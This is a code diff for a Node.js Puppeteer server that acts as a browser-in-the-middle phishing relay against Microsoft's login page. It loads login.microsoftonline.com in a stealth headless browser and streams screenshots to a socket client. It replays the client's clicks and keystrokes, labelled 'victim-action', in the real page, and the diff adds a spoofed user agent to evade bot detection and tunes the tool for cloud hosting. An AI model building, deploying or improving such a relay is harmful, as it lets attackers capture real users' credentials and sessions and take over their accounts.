@@ -5,59 +5,73 @@ const axios = require('axios');
 puppeteer.use(StealthPlugin());
 
 async function startSession(io, socket) {
-    console.log(`[STAGE 1] Launching Puppeteer for ${socket.id}`);
+    console.log(`[INIT] Starting session for ${socket.id}`);
     let browser;
 
     try {
+        // Optimized for Railway/Docker Production
         browser = await puppeteer.launch({
+            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome', // Common Railway path
             headless: "new",
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
                 '--disable-dev-shm-usage',
-                '--single-process' // Crucial for low-memory cloud containers
+                '--disable-gpu',
+                '--no-first-run',
+                '--no-zygote',
+                '--single-process' 
             ]
         });
 
-        console.log(`[STAGE 2] Browser launched. Opening page...`);
         const page = await browser.newPage();
         await page.setViewport({ width: 1280, height: 720 });
 
-        console.log(`[STAGE 3] Navigating to target...`);
+        // Set a standard User Agent to avoid bot detection
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+
+        console.log(`[GOTO] Navigating to Microsoft...`);
         await page.goto('https://login.microsoftonline.com/', { 
-            waitUntil: 'domcontentloaded', // Faster initial response
-            timeout: 60000 
+            waitUntil: 'networkidle0',
+            timeout: 30000 
         });
 
-        // FUNCTION: Send screenshot to UI
-        const streamFrame = async () => {
+        // Forced Render Function
+        const emitFrame = async () => {
             try {
-                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 35 });
+                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
                 socket.emit('browser-render', { screenshot });
+                console.log(`[FRAME] Sent to ${socket.id}`);
             } catch (e) {
-                console.error("Stream error:", e.message);
+                console.error("[!] Render Error:", e.message);
             }
         };
 
-        // Initial frame
-        await streamFrame();
-        console.log(`[STAGE 4] First frame sent to socket ${socket.id}`);
+        // Send the first frame immediately
+        await emitFrame();
 
         socket.on('victim-action', async (data) => {
-            if (data.type === 'click') {
-                await page.mouse.click(data.x, data.y);
-                await streamFrame(); // Update immediately on click
+            try {
+                if (data.type === 'click') {
+                    await page.mouse.click(data.x, data.y);
+                } else if (data.type === 'type') {
+                    await page.type(data.selector || 'body', data.text, { delay: 50 });
+                }
+                // Always re-render after action
+                await emitFrame();
+            } catch (err) {
+                console.error('[!] Action Error:', err.message);
             }
         });
 
         socket.on('disconnect', async () => {
-            console.log(`[CLEANUP] Closing browser for ${socket.id}`);
+            console.log(`[EXIT] Closing browser for ${socket.id}`);
             if (browser) await browser.close();
         });
 
     } catch (error) {
-        console.error('[CRITICAL ERROR]', error.message);
-        socket.emit('error', { msg: "Browser failed to start" });
+        console.error('[CRITICAL FAILURE]', error.message);
+        socket.emit('error', { msg: "Environment setup failed" });
         if (browser) await browser.close();
     }
 }
